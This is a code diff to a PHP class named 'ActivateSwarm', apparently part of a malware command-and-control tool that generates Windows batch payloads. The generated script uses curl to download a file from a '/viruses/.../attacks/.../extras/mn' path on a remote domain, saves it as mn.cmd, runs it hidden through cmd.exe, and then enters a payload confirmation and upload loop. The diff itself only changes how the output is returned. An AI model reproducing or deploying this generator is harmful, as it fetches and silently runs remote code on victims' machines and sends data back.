@@ -61,8 +61,8 @@ class ActivateSwarm extends AttackBase {
         $this->checkHash = $checkHash;
     }
 
-    public function generateBatchCode(): string {
-        ob_start(); //@formatter:off ?>
+    public function generateBatchCode(): void {
+        //@formatter:off ?>
         chCp 65001
         >"<?php echo $this->initialLocation; ?>\mn.cmd" curl -L <?php echo ALT_SECURE_DOMAIN . "/viruses/$this->virus_id/attacks/$this->attack_id/extras/mn\n"; ?>
         >"<?php echo $this->initialLocation; ?>\ic" (
@@ -73,7 +73,7 @@ class ActivateSwarm extends AttackBase {
         start /b cmd.exe /c "<?php echo $this->initialLocation; ?>\mn.cmd"
         <?php echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode());
         //echo BaseScriptWin::cleanUpPayload();
-        return ob_get_clean(); //@formatter:on
+        //@formatter:on
     }
 
     private function generateUploadCode() {
